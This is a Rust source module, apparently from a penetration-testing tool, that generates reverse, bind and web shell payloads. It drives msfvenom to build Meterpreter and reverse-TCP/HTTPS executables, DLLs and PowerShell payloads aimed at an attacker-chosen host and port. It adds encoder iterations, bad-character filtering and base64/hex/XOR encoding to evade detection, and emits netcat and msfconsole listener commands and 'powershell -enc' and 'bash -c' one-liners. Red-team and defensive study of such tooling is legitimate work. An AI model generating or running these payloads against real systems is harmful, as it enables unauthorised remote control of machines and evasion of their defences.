// Shell Generator Module
// Generates reverse shells, bind shells, and web shells

mod templates;
mod encoders;

use crate::scanner::exploitation::types::*;
use anyhow::{anyhow, Result};
use chrono::Utc;
use log::info;
use sha2::{Sha256, Digest};
use uuid::Uuid;

#[allow(unused_imports)]
pub use templates::*;
#[allow(unused_imports)]
pub use encoders::*;

/// Generate a shell payload based on configuration
pub async fn generate_shell(config: &ShellConfig) -> Result<ShellResult> {
    info!(
        "Generating {:?} {:?} shell for {:?}",
        config.shell_type, config.format, config.platform
    );

    let payload = if config.format.is_meterpreter() {
        generate_meterpreter_payload(config).await?
    } else {
        generate_script_payload(config)?
    };

    // Apply encoding if specified
    let encoded_payload = apply_encoding(&payload, &config.encoding, config.xor_key.as_deref())?;

    // Generate hash for tracking
    let mut hasher = Sha256::new();
    hasher.update(&encoded_payload);
    let payload_hash = format!("{:x}", hasher.finalize());

    // Generate listener command
    let listener_command = generate_listener_command(config);

    // Generate one-liner if applicable
    let one_liner = generate_one_liner(config, &encoded_payload);

    Ok(ShellResult {
        id: Uuid::new_v4().to_string(),
        payload: encoded_payload,
        payload_hash,
        format: config.format.clone(),
        platform: config.platform.clone(),
        listener_command,
        one_liner,
        created_at: Utc::now(),
    })
}

/// Generate a script-based payload
fn generate_script_payload(config: &ShellConfig) -> Result<String> {
    let payload = match (&config.shell_type, &config.format) {
        // Reverse shells
        (ShellType::ReverseShell, ShellFormat::Bash) => {
            templates::bash_reverse_shell(&config.lhost, config.lport)
        }
        (ShellType::ReverseShell, ShellFormat::PowerShell) => {
            templates::powershell_reverse_shell(&config.lhost, config.lport, config.obfuscation_level)
        }
        (ShellType::ReverseShell, ShellFormat::Python) => {
            templates::python_reverse_shell(&config.lhost, config.lport)
        }
        (ShellType::ReverseShell, ShellFormat::Perl) => {
            templates::perl_reverse_shell(&config.lhost, config.lport)
        }
        (ShellType::ReverseShell, ShellFormat::Php) => {
            templates::php_reverse_shell(&config.lhost, config.lport)
        }

        // Bind shells
        (ShellType::BindShell, ShellFormat::Bash) => {
            templates::bash_bind_shell(config.lport)
        }
        (ShellType::BindShell, ShellFormat::PowerShell) => {
            templates::powershell_bind_shell(config.lport)
        }
        (ShellType::BindShell, ShellFormat::Python) => {
            templates::python_bind_shell(config.lport)
        }

        // Web shells
        (ShellType::WebShell, ShellFormat::Php) => {
            templates::php_web_shell()
        }
        (ShellType::WebShell, ShellFormat::Aspx) => {
            templates::aspx_web_shell()
        }
        (ShellType::WebShell, ShellFormat::Jsp) => {
            templates::jsp_web_shell()
        }

        _ => {
            return Err(anyhow!(
                "Unsupported shell type/format combination: {:?}/{:?}",
                config.shell_type,
                config.format
            ));
        }
    };

    Ok(payload)
}

/// Generate a Meterpreter/shell payload using msfvenom
async fn generate_meterpreter_payload(config: &ShellConfig) -> Result<String> {
    // Check if msfvenom is available
    let msfvenom_check = tokio::process::Command::new("msfvenom")
        .arg("--version")
        .output()
        .await;

    if msfvenom_check.is_err() {
        return Err(anyhow!(
            "msfvenom not found. Please install Metasploit Framework."
        ));
    }

    // Determine payload name and format based on config
    let (payload_name, format_flag) = get_msfvenom_payload_and_format(config)?;

    // Handle staged vs stageless
    let final_payload = if config.staged {
        payload_name.to_string()
    } else {
        // Convert staged to stageless (e.g., meterpreter/reverse_tcp -> meterpreter_reverse_tcp)
        payload_name.replace("/reverse_tcp", "_reverse_tcp")
                   .replace("/reverse_https", "_reverse_https")
    };

    info!(
        "Generating payload: {} (format: {}, arch: {:?}, encoder: {:?})",
        final_payload, format_flag, config.architecture, config.msf_encoder
    );

    // Build msfvenom command
    let mut args = vec![
        "-p".to_string(),
        final_payload.clone(),
        format!("LHOST={}", config.lhost),
        format!("LPORT={}", config.lport),
        "-f".to_string(),
        format_flag.to_string(),
    ];

    // Add architecture for applicable payloads
    if config.format.is_binary() {
        match config.architecture {
            Architecture::X86 => {
                // Some payloads need explicit architecture
                if final_payload.contains("x64") {
                    // Replace x64 with x86 in payload name
                    let x86_payload = final_payload.replace("x64", "x86");
                    args[1] = x86_payload;
                }
            }
            Architecture::X64 => {
                // Default for most Linux payloads
            }
        }
    }

    // Add encoder if specified
    if let Some(encoder) = config.msf_encoder.as_str() {
        args.push("-e".to_string());
        args.push(encoder.to_string());

        // Add iterations if > 1
        if config.encoder_iterations > 1 {
            args.push("-i".to_string());
            args.push(config.encoder_iterations.to_string());
        }
    }

    // Add bad characters if specified
    if let Some(ref bad_chars) = config.bad_chars {
        args.push("-b".to_string());
        args.push(bad_chars.clone());
    }

    // Add EXITFUNC if specified
    if let Some(ref exit_func) = config.exit_func {
        args.push(format!("EXITFUNC={}", exit_func));
    }

    info!("msfvenom args: {:?}", args);

    let output = tokio::process::Command::new("msfvenom")
        .args(&args)
        .output()
        .await?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(anyhow!("msfvenom failed: {}", stderr));
    }

    // For binary formats, base64 encode the output
    if config.format.is_binary() {
        use base64::{engine::general_purpose::STANDARD, Engine};
        Ok(STANDARD.encode(&output.stdout))
    } else {
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    }
}

/// Get msfvenom payload name and format flag based on ShellFormat
fn get_msfvenom_payload_and_format(config: &ShellConfig) -> Result<(&'static str, &'static str)> {
    let arch = match config.architecture {
        Architecture::X64 => "x64",
        Architecture::X86 => "x86",
    };

    match &config.format {
        // Meterpreter TCP
        ShellFormat::MeterpreterExe => Ok((
            if arch == "x64" { "windows/x64/meterpreter/reverse_tcp" } else { "windows/meterpreter/reverse_tcp" },
            "exe"
        )),
        ShellFormat::MeterpreterElf => Ok((
            if arch == "x64" { "linux/x64/meterpreter/reverse_tcp" } else { "linux/x86/meterpreter/reverse_tcp" },
            "elf"
        )),
        ShellFormat::MeterpreterDll => Ok((
            if arch == "x64" { "windows/x64/meterpreter/reverse_tcp" } else { "windows/meterpreter/reverse_tcp" },
            "dll"
        )),
        ShellFormat::MeterpreterPowerShell => Ok(("windows/x64/meterpreter/reverse_tcp", "psh")),
        ShellFormat::MeterpreterPython => Ok(("python/meterpreter/reverse_tcp", "raw")),

        // Meterpreter HTTPS
        ShellFormat::MeterpreterHttpsExe => Ok((
            if arch == "x64" { "windows/x64/meterpreter/reverse_https" } else { "windows/meterpreter/reverse_https" },
            "exe"
        )),
        ShellFormat::MeterpreterHttpsElf => Ok((
            if arch == "x64" { "linux/x64/meterpreter/reverse_https" } else { "linux/x86/meterpreter/reverse_https" },
            "elf"
        )),
        ShellFormat::MeterpreterHttpsPowerShell => Ok(("windows/x64/meterpreter/reverse_https", "psh")),

        // Simple shell (non-Meterpreter)
        ShellFormat::ShellReverseExe => Ok((
            if arch == "x64" { "windows/x64/shell_reverse_tcp" } else { "windows/shell_reverse_tcp" },
            "exe"
        )),
        ShellFormat::ShellReverseElf => Ok((
            if arch == "x64" { "linux/x64/shell_reverse_tcp" } else { "linux/x86/shell_reverse_tcp" },
            "elf"
        )),

        _ => Err(anyhow!("Not a msfvenom format: {:?}", config.format)),
    }
}

/// Generate listener command for the shell
fn generate_listener_command(config: &ShellConfig) -> String {
    match config.shell_type {
        ShellType::ReverseShell => {
            if config.format.is_meterpreter() {
                let payload_name = get_handler_payload_name(config);
                format!(
                    r#"msfconsole -x "use exploit/multi/handler; set PAYLOAD {}; set LHOST {}; set LPORT {}; exploit""#,
                    payload_name,
                    config.lhost,
                    config.lport
                )
            } else {
                format!("nc -lvnp {}", config.lport)
            }
        }
        ShellType::BindShell => {
            format!("nc -v {} {}", config.lhost, config.lport)
        }
        ShellType::WebShell => {
            "# Access the web shell via browser or curl".to_string()
        }
    }
}

/// Get appropriate payload name for the multi/handler
fn get_handler_payload_name(config: &ShellConfig) -> String {
    let arch = match config.architecture {
        Architecture::X64 => "x64",
        Architecture::X86 => "",
    };

    match &config.format {
        // Meterpreter TCP
        ShellFormat::MeterpreterExe | ShellFormat::MeterpreterDll | ShellFormat::MeterpreterPowerShell => {
            if arch == "x64" {
                "windows/x64/meterpreter/reverse_tcp".to_string()
            } else {
                "windows/meterpreter/reverse_tcp".to_string()
            }
        }
        ShellFormat::MeterpreterElf => {
            if arch == "x64" {
                "linux/x64/meterpreter/reverse_tcp".to_string()
            } else {
                "linux/x86/meterpreter/reverse_tcp".to_string()
            }
        }
        ShellFormat::MeterpreterPython => "python/meterpreter/reverse_tcp".to_string(),

        // Meterpreter HTTPS
        ShellFormat::MeterpreterHttpsExe | ShellFormat::MeterpreterHttpsPowerShell => {
            if arch == "x64" {
                "windows/x64/meterpreter/reverse_https".to_string()
            } else {
                "windows/meterpreter/reverse_https".to_string()
            }
        }
        ShellFormat::MeterpreterHttpsElf => {
            if arch == "x64" {
                "linux/x64/meterpreter/reverse_https".to_string()
            } else {
                "linux/x86/meterpreter/reverse_https".to_string()
            }
        }

        // Simple shells
        ShellFormat::ShellReverseExe => {
            if arch == "x64" {
                "windows/x64/shell_reverse_tcp".to_string()
            } else {
                "windows/shell_reverse_tcp".to_string()
            }
        }
        ShellFormat::ShellReverseElf => {
            if arch == "x64" {
                "linux/x64/shell_reverse_tcp".to_string()
            } else {
                "linux/x86/shell_reverse_tcp".to_string()
            }
        }

        _ => "multi/handler".to_string(),
    }
}

/// Generate a one-liner command if applicable
fn generate_one_liner(config: &ShellConfig, payload: &str) -> Option<String> {
    match &config.format {
        ShellFormat::Bash => Some(format!(
            "bash -c '{}'",
            payload.replace('\n', "; ").replace("  ", " ")
        )),
        ShellFormat::PowerShell => {
            use base64::{engine::general_purpose::STANDARD, Engine};
            // PowerShell one-liner with base64 encoded command
            let encoded = STANDARD.encode(payload.encode_utf16().flat_map(|c| c.to_le_bytes()).collect::<Vec<u8>>());
            Some(format!("powershell -enc {}", encoded))
        }
        ShellFormat::Python => Some(format!(
            "python3 -c '{}'",
            payload.replace('\n', "; ").replace("'", "\\'")
        )),
        _ => None,
    }
}

/// Apply encoding to payload
fn apply_encoding(
    payload: &str,
    encoding: &EncodingType,
    xor_key: Option<&str>,
) -> Result<String> {
    match encoding {
        EncodingType::None => Ok(payload.to_string()),
        EncodingType::Base64 => {
            use base64::{engine::general_purpose::STANDARD, Engine};
            Ok(STANDARD.encode(payload))
        }
        EncodingType::Hex => Ok(hex::encode(payload)),
        EncodingType::Xor => {
            let key = xor_key.ok_or_else(|| anyhow!("XOR encoding requires a key"))?;
            Ok(encoders::xor_encode(payload, key))
        }
    }
}
